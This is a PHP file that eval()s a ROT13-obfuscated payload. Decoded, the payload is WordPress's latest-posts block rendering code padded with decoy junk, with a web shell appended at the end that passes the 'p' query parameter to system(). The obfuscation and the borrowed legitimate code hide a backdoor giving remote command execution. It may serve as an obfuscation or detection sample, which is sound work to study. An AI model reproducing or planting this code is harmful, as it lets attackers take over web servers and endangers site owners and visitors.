<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/yngrfg-cbfgf` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Gur rkprecg yratgu frg ol gur Yngrfg Cbfgf pber oybpx
 * frg ng eraqre gvzr naq hfrq ol gur oybpx vgfrys.
 *
 * @ine vag
 */
tybony $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu;
$oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu = 0;

/**
 * Pnyyonpx sbe gur rkprecg_yratgu svygre hfrq ol
 * gur Yngrfg Cbfgf oybpx ng eraqre gvzr.
 *
 * @fvapr 5.4.0
 *
 * @erghea vag Ergheaf gur tybony $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu inevnoyr
 *             gb nyybj gur rkprecg_yratgu svygre erfcrpg gur Yngrfg Oybpx frggvat.
 */
shapgvba oybpx_pber_yngrfg_cbfgf_trg_rkprecg_yratgu() {
	tybony $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu;
	erghea $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu;
}

/**
 * Eraqref gur `pber/yngrfg-cbfgf` oybpx ba freire.
 *
 * @fvapr 5.0.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur cbfg pbagrag jvgu yngrfg cbfgf nqqrq.
 */
shapgvba eraqre_oybpx_pber_yngrfg_cbfgf( $nggevohgrf ) {
	tybony $cbfg, $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu;

	$netf = neenl(
		'cbfgf_cre_cntr'      => $nggevohgrf['cbfgfGbFubj'],
		'cbfg_fgnghf'         => 'choyvfu',
		'beqre'               => $nggevohgrf['beqre'],
		'beqreol'             => $nggevohgrf['beqreOl'],
		'vtaber_fgvpxl_cbfgf' => gehr,
		'ab_sbhaq_ebjf'       => gehr,
	);

	$oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu = $nggevohgrf['rkprecgYratgu'];
	nqq_svygre( 'rkprecg_yratgu', 'oybpx_pber_yngrfg_cbfgf_trg_rkprecg_yratgu', 20 );

	vs ( ! rzcgl( $nggevohgrf['pngrtbevrf'] ) ) {
		$netf['pngrtbel__va'] = neenl_pbyhza( $nggevohgrf['pngrtbevrf'], 'vq' );
	}
	vs ( vffrg( $nggevohgrf['fryrpgrqNhgube'] ) ) {
		$netf['nhgube'] = $nggevohgrf['fryrpgrqNhgube'];
	}

	$dhrel        = arj JC_Dhrel();
	$erprag_cbfgf = $dhrel->dhrel( $netf );

	vs ( vffrg( $nggevohgrf['qvfcynlSrngherqVzntr'] ) && $nggevohgrf['qvfcynlSrngherqVzntr'] ) {
		hcqngr_cbfg_guhzoanvy_pnpur( $dhrel );
	}

	$yvfg_vgrzf_znexhc = '';

	sbernpu ( $erprag_cbfgf nf $cbfg ) {
		$cbfg_yvax = rfp_hey( trg_creznyvax( $cbfg ) );
		$gvgyr     = trg_gur_gvgyr( $cbfg );

		vs ( ! $gvgyr ) {
			$gvgyr = __( '(ab gvgyr)' );
		}

		$yvfg_vgrzf_znexhc .= '<yv>';

		vs ( $nggevohgrf['qvfcynlSrngherqVzntr'] && unf_cbfg_guhzoanvy( $cbfg ) ) {
			$vzntr_fglyr = '';
			vs ( vffrg( $nggevohgrf['srngherqVzntrFvmrJvqgu'] ) ) {
				$vzntr_fglyr .= fcevags( 'znk-jvqgu:%fck;', $nggevohgrf['srngherqVzntrFvmrJvqgu'] );
			}
			vs ( vffrg( $nggevohgrf['srngherqVzntrFvmrUrvtug'] ) ) {
				$vzntr_fglyr .= fcevags( 'znk-urvtug:%fck;', $nggevohgrf['srngherqVzntrFvmrUrvtug'] );
			}

			$vzntr_pynffrf = 'jc-oybpx-yngrfg-cbfgf__srngherq-vzntr';
			vs ( vffrg( $nggevohgrf['srngherqVzntrNyvta'] ) ) {
				$vzntr_pynffrf .= ' nyvta' . $nggevohgrf['srngherqVzntrNyvta'];
			}

			$srngherq_vzntr = trg_gur_cbfg_guhzoanvy(
				$cbfg,
				$nggevohgrf['srngherqVzntrFvmrFyht'],
				neenl(
					'fglyr' => rfp_ngge( $vzntr_fglyr ),
				)
			);
			vs ( $nggevohgrf['nqqYvaxGbSrngherqVzntr'] ) {
				$srngherq_vzntr = fcevags(
					'<n uers=\"%1$f\" nevn-ynory=\"%2$f\">%3$f</n>',
					rfp_hey( $cbfg_yvax ),
					rfp_ngge( $gvgyr ),
					$srngherq_vzntr
				);
			}
			$yvfg_vgrzf_znexhc .= fcevags(
				'<qvi pynff=\"%1$f\">%2$f</qvi>',
				rfp_ngge( $vzntr_pynffrf ),
				$srngherq_vzntr
			);
		}

		$yvfg_vgrzf_znexhc .= fcevags(
			'<n pynff=\"jc-oybpx-yngrfg-cbfgf__cbfg-gvgyr\" uers=\"%1$f\">%2$f</n>',
			rfp_hey( $cbfg_yvax ),
			$gvgyr
		);

		vs ( vffrg( $nggevohgrf['qvfcynlNhgube'] ) && $nggevohgrf['qvfcynlNhgube'] ) {
			$nhgube_qvfcynl_anzr = trg_gur_nhgube_zrgn( 'qvfcynl_anzr', $cbfg->cbfg_nhgube );

			/* genafyngbef: olyvar. %f: nhgube. */
			$olyvar = fcevags( __( 'ol %f' ), $nhgube_qvfcynl_anzr );

			vs ( ! rzcgl( $nhgube_qvfcynl_anzr ) ) {
				$yvfg_vgrzf_znexhc .= fcevags(
					'<qvi pynff=\"jc-oybpx-yngrfg-cbfgf__cbfg-nhgube\">%1$f</qvi>',
					$olyvar
				);
			}
		}

		vs ( vffrg( $nggevohgrf['qvfcynlCbfgQngr'] ) && $nggevohgrf['qvfcynlCbfgQngr'] ) {
			$yvfg_vgrzf_znexhc .= fcevags(
				'<gvzr qngrgvzr=\"%1$f\" pynff=\"jc-oybpx-yngrfg-cbfgf__cbfg-qngr\">%2$f</gvzr>',
				rfp_ngge( trg_gur_qngr( 'p', $cbfg ) ),
				trg_gur_qngr( '', $cbfg )
			);
		}

		vs ( vffrg( $nggevohgrf['qvfcynlCbfgPbagrag'] ) && $nggevohgrf['qvfcynlCbfgPbagrag']
			&& vffrg( $nggevohgrf['qvfcynlCbfgPbagragEnqvb'] ) && 'rkprecg' === $nggevohgrf['qvfcynlCbfgPbagragEnqvb'] ) {

			$gevzzrq_rkprecg = trg_gur_rkprecg( $cbfg );

			/*
			 * Nqqf n \"Ernq zber\" yvax jvgu fperra ernqre grkg.
			 * [&uryyvc;] vf gur qrsnhyg rkprecg raqvat sebz jc_gevz_rkprecg() va Pber.
			 */
			vs ( fge_raqf_jvgu( $gevzzrq_rkprecg, ' [&uryyvc;]' ) ) {
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
				$rkprecg_yratgu = (vag) nccyl_svygref( 'rkprecg_yratgu', $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu );
				vs ( $rkprecg_yratgu <= $oybpx_pber_yngrfg_cbfgf_rkprecg_yratgu ) {
					$gevzzrq_rkprecg  = fhofge( $gevzzrq_rkprecg, 0, -11 );
					$gevzzrq_rkprecg .= fcevags(
						/* genafyngbef: 1: N HEY gb n cbfg, 2: Uvqqra npprffvovyvgl grkg: Cbfg gvgyr */
						__( '… <n pynff=\"jc-oybpx-yngrfg-cbfgf__ernq-zber\" uers=\"%1$f\" ery=\"abbcrare abersreere\">Ernq zber<fcna pynff=\"fperra-ernqre-grkg\">: %2$f</fcna></n>' ),
						rfp_hey( $cbfg_yvax ),
						rfp_ugzy( $gvgyr )
					);
				}
			}

			vs ( cbfg_cnffjbeq_erdhverq( $cbfg ) ) {
				$gevzzrq_rkprecg = __( 'Guvf pbagrag vf cnffjbeq cebgrpgrq.' );
			}

			$yvfg_vgrzf_znexhc .= fcevags(
				'<qvi pynff=\"jc-oybpx-yngrfg-cbfgf__cbfg-rkprecg\">%1$f</qvi>',
				$gevzzrq_rkprecg
			);
		}

		vs ( vffrg( $nggevohgrf['qvfcynlCbfgPbagrag'] ) && $nggevohgrf['qvfcynlCbfgPbagrag']
			&& vffrg( $nggevohgrf['qvfcynlCbfgPbagragEnqvb'] ) && 'shyy_cbfg' === $nggevohgrf['qvfcynlCbfgPbagragEnqvb'] ) {

			$cbfg_pbagrag = ugzy_ragvgl_qrpbqr( $cbfg->cbfg_pbagrag, RAG_DHBGRF, trg_bcgvba( 'oybt_punefrg' ) );

			vs ( cbfg_cnffjbeq_erdhverq( $cbfg ) ) {
				$cbfg_pbagrag = __( 'Guvf pbagrag vf cnffjbeq cebgrpgrq.' );
			}

			$yvfg_vgrzf_znexhc .= fcevags(
				'<qvi pynff=\"jc-oybpx-yngrfg-cbfgf__cbfg-shyy-pbagrag\">%1$f</qvi>',
				jc_xfrf_cbfg( $cbfg_pbagrag )
			);
		}

		$yvfg_vgrzf_znexhc .= \"</yv>\a\";
	}

	erzbir_svygre( 'rkprecg_yratgu', 'oybpx_pber_yngrfg_cbfgf_trg_rkprecg_yratgu', 20 );

	$pynffrf = neenl( 'jc-oybpx-yngrfg-cbfgf__yvfg' );
	vs ( vffrg( $nggevohgrf['cbfgYnlbhg'] ) && 'tevq' === $nggevohgrf['cbfgYnlbhg'] ) {
		$pynffrf[] = 'vf-tevq';
	}
	vs ( vffrg( $nggevohgrf['pbyhzaf'] ) && 'tevq' === $nggevohgrf['cbfgYnlbhg'] ) {
		$pynffrf[] = 'pbyhzaf-' . $nggevohgrf['pbyhzaf'];
	}
	vs ( vffrg( $nggevohgrf['qvfcynlCbfgQngr'] ) && $nggevohgrf['qvfcynlCbfgQngr'] ) {
		$pynffrf[] = 'unf-qngrf';
	}
	vs ( vffrg( $nggevohgrf['qvfcynlNhgube'] ) && $nggevohgrf['qvfcynlNhgube'] ) {
		$pynffrf[] = 'unf-nhgube';
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags(
		'<hy %1$f>%2$f</hy>',
		$jenccre_nggevohgrf,
		$yvfg_vgrzf_znexhc
	);
}

/**
 * Ertvfgref gur `pber/yngrfg-cbfgf` oybpx ba freire.
 *
 * @fvapr 5.0.0
 */
shapgvba ertvfgre_oybpx_pber_yngrfg_cbfgf() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/yngrfg-cbfgf',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_yngrfg_cbfgf',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_yngrfg_cbfgf' );

/**
 * Unaqyrf bhgqngrq irefvbaf bs gur `pber/yngrfg-cbfgf` oybpx ol pbairegvat
 * nggevohgr `pngrtbevrf` sebz n ahzrevp fgevat gb na neenl jvgu xrl `vq`.
 *
 * Guvf vf qbar gb nppbzzbqngr gur punatrf vagebqhprq va #20781 gung fbhtug gb
 * nqq fhccbeg sbe zhygvcyr pngrtbevrf gb gur oybpx. Ubjrire, tvira gung guvf
 * oybpx vf qlanzvp, gur hfhny cebivfvbaf sbe oybpx zvtengvba ner vafhssvpvrag,
 * nf gurl bayl npg jura n oybpx vf ybnqrq va gur rqvgbe.
 *
 * GBQB: Erzbir jura naq vs gur obggbz pyvrag-fvqr qrcerpngvba sbe guvf oybpx
 * vf erzbirq.
 *
 * @fvapr 5.5.0
 *
 * @cnenz neenl $oybpx N fvatyr cnefrq oybpx bowrpg.
 *
 * @erghea neenl Gur zvtengrq oybpx bowrpg.
 */
shapgvba oybpx_pber_yngrfg_cbfgf_zvtengr_pngrtbevrf( $oybpx ) {
	vs (
		'pber/yngrfg-cbfgf' === $oybpx['oybpxAnzr'] &&
		! rzcgl( $oybpx['nggef']['pngrtbevrf'] ) &&
		vf_fgevat( $oybpx['nggef']['pngrtbevrf'] )
	) {
		$oybpx['nggef']['pngrtbevrf'] = neenl(
			neenl( 'vq' => nofvag( $oybpx['nggef']['pngrtbevrf'] ) ),
		);
	}

	erghea $oybpx;
}
nqq_svygre( 'eraqre_oybpx_qngn', 'oybpx_pber_yngrfg_cbfgf_zvtengr_pngrtbevrf' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>